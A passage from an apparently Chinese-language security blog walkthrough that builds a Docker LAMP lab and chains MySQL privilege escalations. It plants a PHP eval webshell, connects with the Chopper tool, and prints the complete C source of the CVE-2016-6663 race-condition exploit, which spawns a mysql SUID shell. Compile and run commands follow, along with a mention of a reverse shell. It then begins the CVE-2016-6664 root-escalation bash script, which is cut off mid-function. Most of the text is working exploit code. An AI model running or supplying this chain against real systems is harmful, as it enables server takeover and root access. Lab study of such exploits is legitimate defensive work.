-<p>然后将&lt;?php @eval($_POST[123456]);?&gt;写入保存，并赋予我们任何用户在web路径的可读可写可执行权限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 /var/www/html</span><br></pre></td></tr></table></figure></p>
-<p>然后我们进入数据库，添加一个对test库有create,drop,insert,select权限的test用户，密码为123456<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">create database test;</span><br><span class="line">CREATE USER &apos;test&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos;; </span><br><span class="line">grant create,drop,insert,select on test.* to &apos;test&apos;@&apos;%&apos;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv05.png?raw=true" alt=""></p>
-<p>配置好之后，我们将apache2和mysql服务重启<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service restart apache2</span><br><span class="line">service restart mysql</span><br></pre></td></tr></table></figure></p>
-<p>然后我们退出当前连接，将配置好的容器提交为一个新容器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit dfdd42e8e688 leticia0/lamp</span><br></pre></td></tr></table></figure></p>
-<p>然后以将新容器的80端口映射到8080端口，3306映射到3306端口的方式运行容器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -p 3306:3306 leticia0/lamp</span><br></pre></td></tr></table></figure></p>
-<p>通过本机访问docker的web应用，看到如下界面说明环境搭建成功。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv06.png?raw=true" alt=""></p>
-<h3 id="www-data权限提升为mysql权限"><a href="#www-data权限提升为mysql权限" class="headerlink" title="www-data权限提升为mysql权限"></a>www-data权限提升为mysql权限</h3><p>接下来我们用菜刀连接刚才的webshell</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv07.png?raw=true" alt=""></p>
-<p>使用whoami可以看到当前权限是www-data</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv08.png?raw=true" alt=""></p>
-<p>运行ls -ld，可以发现我们目前的www-data只有对html目录是可读可写可执行的，所以我们需要将exp写入html目录</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv09.png?raw=true" alt=""></p>
-<p>CVE-2016-6663 exp网址： <a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</a></p>
-<p>CVE=2016-6663 exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;grp.h&gt;</span><br><span class="line">#include &lt;mysql.h&gt;</span><br><span class="line">#include &lt;pwd.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/inotify.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define EXP_PATH          &quot;/tmp/mysql_privesc_exploit&quot;</span><br><span class="line">#define EXP_DIRN          &quot;mysql_privesc_exploit&quot;</span><br><span class="line">#define MYSQL_TAB_FILE    EXP_PATH &quot;/exploit_table.MYD&quot;</span><br><span class="line">#define MYSQL_TEMP_FILE   EXP_PATH &quot;/exploit_table.TMD&quot;</span><br><span class="line"></span><br><span class="line">#define SUID_SHELL   	  EXP_PATH &quot;/mysql_suid_shell.MYD&quot;</span><br><span class="line"></span><br><span class="line">#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary</span><br><span class="line"></span><br><span class="line">MYSQL *conn;		  // DB handles</span><br><span class="line">MYSQL_RES *res;</span><br><span class="line">MYSQL_ROW row;</span><br><span class="line"></span><br><span class="line">unsigned long cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void intro() &#123;</span><br><span class="line"></span><br><span class="line">printf( </span><br><span class="line">        &quot;\033[94m\n&quot;</span><br><span class="line">        &quot;MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n&quot;</span><br><span class="line">        &quot;mysql-privesc-race.c (ver. 1.0)\n\n&quot;</span><br><span class="line">        &quot;CVE-2016-6663 / CVE-2016-5616\n\n&quot;</span><br><span class="line">        &quot;For testing purposes only. Do no harm.\n\n&quot;</span><br><span class="line">	&quot;Discovered/Coded by:\n\n&quot;</span><br><span class="line">	&quot;Dawid Golunski \n&quot;</span><br><span class="line">	&quot;http://legalhackers.com&quot;</span><br><span class="line">        &quot;\033[0m\n\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void usage(char *argv0) &#123;</span><br><span class="line">    intro();</span><br><span class="line">    printf(&quot;Usage:\n\n%s user pass db_host database\n\n&quot;, argv0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mysql_cmd(char *sql_cmd, int silent) &#123;</span><br><span class="line">    </span><br><span class="line">    if (!silent) &#123;</span><br><span class="line">	    printf(&quot;%s \n&quot;, sql_cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    if (mysql_query(conn, sql_cmd)) &#123;</span><br><span class="line">        fprintf(stderr, &quot;%s\n&quot;, mysql_error(conn));</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    res = mysql_store_result(conn);</span><br><span class="line">    if (res&gt;0) mysql_free_result(res);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc,char **argv)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    int randomnum = 0;</span><br><span class="line">    int io_notified = 0;</span><br><span class="line">    int myd_handle;</span><br><span class="line">    int wpid;</span><br><span class="line">    int is_shell_suid=0;</span><br><span class="line">    pid_t pid;</span><br><span class="line">    int status;</span><br><span class="line">    struct stat st;</span><br><span class="line">    /* io notify */</span><br><span class="line">    int fd;</span><br><span class="line">    int ret;</span><br><span class="line">    char buf[4096] __attribute__((aligned(8)));</span><br><span class="line">    int num_read;</span><br><span class="line">    struct inotify_event *event;</span><br><span class="line">    /* credentials */</span><br><span class="line">    char *user     = argv[1];</span><br><span class="line">    char *password = argv[2];</span><br><span class="line">    char *db_host  = argv[3];</span><br><span class="line">    char *database = argv[4];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // Disable buffering of stdout</span><br><span class="line">    setvbuf(stdout, NULL, _IONBF, 0);</span><br><span class="line"></span><br><span class="line">    // Get the params</span><br><span class="line">    if (argc!=5) &#123;</span><br><span class="line">	usage(argv[0]);</span><br><span class="line">	exit(1);</span><br><span class="line">    &#125; </span><br><span class="line">    intro();</span><br><span class="line">    // Show initial privileges</span><br><span class="line">    printf(&quot;\n[+] Starting the exploit as: \n&quot;);</span><br><span class="line">    system(&quot;id&quot;);</span><br><span class="line"></span><br><span class="line">    // Connect to the database server with provided credentials</span><br><span class="line">    printf(&quot;\n[+] Connecting to the database `%s` as %s@%s\n&quot;, database, user, db_host);</span><br><span class="line">    conn = mysql_init(NULL);</span><br><span class="line">    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) &#123;</span><br><span class="line">        fprintf(stderr, &quot;%s\n&quot;, mysql_error(conn));</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prepare tmp dir</span><br><span class="line">    printf(&quot;\n[+] Creating exploit temp directory %s\n&quot;, &quot;/tmp/&quot; EXP_DIRN);</span><br><span class="line">    umask(000);</span><br><span class="line">    system(&quot;rm -rf /tmp/&quot; EXP_DIRN &quot; &amp;&amp; mkdir /tmp/&quot; EXP_DIRN);</span><br><span class="line">    system(&quot;chmod g+s /tmp/&quot; EXP_DIRN );</span><br><span class="line"></span><br><span class="line">    // Prepare exploit tables :)</span><br><span class="line">    printf(&quot;\n[+] Creating mysql tables \n\n&quot;);</span><br><span class="line">    mysql_cmd(&quot;DROP TABLE IF EXISTS exploit_table&quot;, 0);</span><br><span class="line">    mysql_cmd(&quot;DROP TABLE IF EXISTS mysql_suid_shell&quot;, 0);</span><br><span class="line">    mysql_cmd(&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &apos;MyISAM&apos; data directory &apos;&quot; EXP_PATH &quot;&apos;&quot;, 0);</span><br><span class="line">    mysql_cmd(&quot;CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = &apos;MyISAM&apos; data directory &apos;&quot; EXP_PATH &quot;&apos;&quot;, 0);</span><br><span class="line"></span><br><span class="line">    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span><br><span class="line">    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span><br><span class="line">    printf(&quot;\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n&quot;);</span><br><span class="line">    system(&quot;cp /bin/bash &quot; SUID_SHELL);</span><br><span class="line">    system(&quot;ls -l &quot; SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    // Use inotify to get the timing right</span><br><span class="line">    fd = inotify_init();</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        printf(&quot;failed to inotify_init\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span><br><span class="line"></span><br><span class="line">    printf(&quot;\n[+] Entering the race loop... Hang in there...\n&quot;);</span><br><span class="line"></span><br><span class="line">    while ( is_shell_suid != 1 ) &#123;</span><br><span class="line"></span><br><span class="line">        cnt++;</span><br><span class="line">	if ( (cnt % 100) == 0 ) &#123;</span><br><span class="line">	 	printf(&quot;-&gt;&quot;);</span><br><span class="line">	 	//fflush(stdout);	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        /* Create empty file , remove if already exists */</span><br><span class="line">        unlink(MYSQL_TEMP_FILE);</span><br><span class="line">        unlink(MYSQL_TAB_FILE);</span><br><span class="line">   	mysql_cmd(&quot;DROP TABLE IF EXISTS exploit_table&quot;, 1);</span><br><span class="line">	mysql_cmd(&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &apos;MyISAM&apos; data directory &apos;&quot; EXP_PATH &quot;&apos;&quot;, 1);</span><br><span class="line"></span><br><span class="line">	/* random num if needed */</span><br><span class="line">        srand ( time(NULL) );</span><br><span class="line">        randomnum = ( rand() % MAX_DELAY );</span><br><span class="line"></span><br><span class="line">        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span><br><span class="line">        pid = fork();</span><br><span class="line">        if (pid &lt; 0) &#123;</span><br><span class="line">            fprintf(stderr, &quot;Fork failed :(\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* Child process - executes REPAIR TABLE  SQL statement */</span><br><span class="line">        if (pid == 0) &#123;</span><br><span class="line">            usleep(500);</span><br><span class="line">            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">	    mysql_cmd(&quot;REPAIR TABLE exploit_table EXTENDED&quot;, 1);</span><br><span class="line">            // child stops here</span><br><span class="line">            exit(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span><br><span class="line">        if (pid &gt; 0 ) &#123;</span><br><span class="line">            io_notified = 0;</span><br><span class="line"></span><br><span class="line">            while (1) &#123;</span><br><span class="line">                int processed = 0;</span><br><span class="line">                ret = read(fd, buf, sizeof(buf));</span><br><span class="line">                if (ret &lt; 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                while (processed &lt; ret) &#123;</span><br><span class="line">                    event = (struct inotify_event *)(buf + processed);</span><br><span class="line">                    if (event-&gt;mask &amp; IN_CLOSE) &#123;</span><br><span class="line">                        if (!strcmp(event-&gt;name, &quot;exploit_table.TMD&quot;)) &#123;</span><br><span class="line">                            //usleep(randomnum);</span><br><span class="line"></span><br><span class="line">			    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span><br><span class="line">			    unlink(MYSQL_TAB_FILE);</span><br><span class="line">			    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);</span><br><span class="line">			    close(myd_handle);</span><br><span class="line">			    chmod(MYSQL_TAB_FILE, 04777);</span><br><span class="line"></span><br><span class="line">			    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span><br><span class="line">                            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);</span><br><span class="line">                            io_notified=1;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    processed += sizeof(struct inotify_event);</span><br><span class="line">                &#125;</span><br><span class="line">                if (io_notified) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            waitpid(pid, &amp;status, 0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	// Check if SUID bit was set at the end of this attempt</span><br><span class="line">        if ( lstat(SUID_SHELL, &amp;st) == 0 ) &#123;</span><br><span class="line">	    if (st.st_mode &amp; S_ISUID) &#123;</span><br><span class="line">		is_shell_suid = 1;</span><br><span class="line">	    &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n&quot;, cnt);</span><br><span class="line">    system(&quot;ls -l &quot; SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    printf(&quot;\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n&quot;);</span><br><span class="line">    system(SUID_SHELL &quot; -p -i &quot;);</span><br><span class="line">    //system(SUID_SHELL &quot; -p -c &apos;/bin/bash -i -p&apos;&quot;);</span><br><span class="line"></span><br><span class="line">    /* close MySQL connection and exit */</span><br><span class="line">    printf(&quot;\n[+] Job done. Exiting\n\n&quot;);</span><br><span class="line">    mysql_close(conn);</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>我们通过菜刀写入exp：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv10.png?raw=true" alt=""></p>
-<p>菜刀这里执行总失败，我通过写入另一个shell反弹之后编译并执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</span><br><span class="line">./mysql-privesc-race test 123456 localhost test</span><br></pre></td></tr></table></figure></p>
-<p>成功提权</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv11.png?raw=true" alt=""></p>
-<h3 id="mysql提升为root权限"><a href="#mysql提升为root权限" class="headerlink" title="mysql提升为root权限"></a>mysql提升为root权限</h3><p>tutum/lamp日志方式不是默认的基于文件的日志，而是syslog，所以我们首先要将它改为默认配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/mysql/conf.d/mysqld_safe_syslog.cnf</span><br></pre></td></tr></table></figure></p>
-<p>删除掉syslog，然后重启mysql，查看是否更改成功，如果更改成功，下面命令产生空结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r syslog /etc/mysqlsqld_safe_syslog.cnf</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv12.png?raw=true" alt=""></p>
-<p>CVE-2016-6664 exp网址：<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</a></p>
-<p>CVE-2016-6664 exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash -p</span><br><span class="line">#</span><br><span class="line"># MySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit</span><br><span class="line"># mysql-chowned.sh (ver. 1.0)</span><br><span class="line">#</span><br><span class="line"># CVE-2016-6664 / OCVE-2016-5617</span><br><span class="line">#</span><br><span class="line"># Discovered and coded by:</span><br><span class="line">#</span><br><span class="line"># Dawid Golunski</span><br><span class="line"># dawid[at]legalhackers.com</span><br><span class="line">#</span><br><span class="line"># https://legalhackers.com</span><br><span class="line">#</span><br><span class="line"># Follow https://twitter.com/dawid_golunski for updates on this advisory.</span><br><span class="line">#</span><br><span class="line"># This PoC exploit allows attackers to (instantly) escalate their privileges</span><br><span class="line"># from mysql system account to root through unsafe error log handling.</span><br><span class="line"># The exploit requires that file-based logging has been configured (default).</span><br><span class="line"># To confirm that syslog logging has not been enabled instead use:</span><br><span class="line"># grep -r syslog /etc/mysql</span><br><span class="line"># which should return no results.</span><br><span class="line">#</span><br><span class="line"># This exploit can be chained with the following vulnerability:</span><br><span class="line"># CVE-2016-6663 / OCVE-2016-5616</span><br><span class="line"># which allows attackers to gain access to mysql system account (mysql shell).</span><br><span class="line">#</span><br><span class="line"># In case database server has been configured with syslog you may also use:</span><br><span class="line"># CVE-2016-6662 as an alternative to this exploit.</span><br><span class="line">#</span><br><span class="line"># Usage:</span><br><span class="line"># ./mysql-chowned.sh path_to_error.log </span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># See the full advisory for details at:</span><br><span class="line"># https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</span><br><span class="line">#</span><br><span class="line"># Video PoC:</span><br><span class="line"># https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html</span><br><span class="line">#</span><br><span class="line"># Disclaimer:</span><br><span class="line"># For testing purposes only. Do no harm.</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">BACKDOORSH=&quot;/bin/bash&quot;</span><br><span class="line">BACKDOORPATH=&quot;/tmp/mysqlrootsh&quot;</span><br><span class="line">PRIVESCLIB=&quot;/tmp/privesclib.so&quot;</span><br><span class="line">PRIVESCSRC=&quot;/tmp/privesclib.c&quot;</span><br><span class="line">SUIDBIN=&quot;/usr/bin/sudo&quot;</span><br><span class="line"></span><br><span class="line">function cleanexit &#123;</span><br><span class="line">    # Cleanup </span><br><span class="line">    echo -e &quot;\n[+] Cleaning up...&quot;</span><br><span class="line">    rm -f $PRIVESCSRC</span><br><span class="line">    rm -f $PRIVESCLIB</span><br><span class="line">    rm -f 